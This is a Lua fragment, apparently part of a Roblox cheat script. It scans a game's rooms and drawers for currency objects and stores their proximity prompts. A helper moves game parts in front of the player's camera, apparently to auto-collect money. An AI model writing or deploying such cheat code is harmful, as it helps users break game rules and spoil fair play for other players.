local Currency = {
	MinCurrency = 0,
	MaxCurrency = 0,
	
	CurrentProxyPart = nil,
	CurrentProxyPartCFrame = nil,
	CurrentProxyPartPrompt = nil
}

function PartInFrontOfCamera(Part, LookVectorOffset)
	Part.CFrame = CFrame.new(
		Main.CurrentCamera.CFrame.Position + Main.CurrentCamera.CFrame.LookVector * LookVectorOffset
	) * CFrame.fromOrientation(0, 0, 0)
end

function GetMoneyFrom(Folder)
	if Script.Settings.AutoPickCurrency == true then
		for _, Drawer in Folder:GetChildren() do
			if Drawer:FindFirstChild("SpawnLocations") then
				for _, SpawnLocation in Drawer.SpawnLocations:GetChildren() do
					for _, Money in SpawnLocation:GetChildren() do
						if Money:FindFirstChild("ProxyPart") and Money:GetAttribute("InteractionType") and Money:GetAttribute("Amount") then
							Currency.CurrentProxyPart = Money.ProxyPart
							Currency.CurrentProxyPartCFrame = Money.ProxyPart.CFrame
							for _, Prompt in Money.ProxyPart:GetChildren() do
								if Prompt:IsA("ProximityPrompt") then
									if Prompt.Exclusivity == Enum.ProximityPromptExclusivity.OnePerButton then
										Currency.CurrentProxyPartPrompt = Prompt
									end
								end
							end
							return
						end
					end
				end
			end
		end
	end
	
	Currency.CurrentProxyPart = nil
	Currency.CurrentProxyPartCFrame = nil
	Currency.CurrentProxyPartPrompt = nil
end

function FindMoney()
	for _, Room in Main.RoomsFolder:GetChildren() do
		GetMoneyFrom(Room)
		if Room:FindFirstChild("Interactables") then
			GetMoneyFrom(Room.Interactables)
		end
	end
end

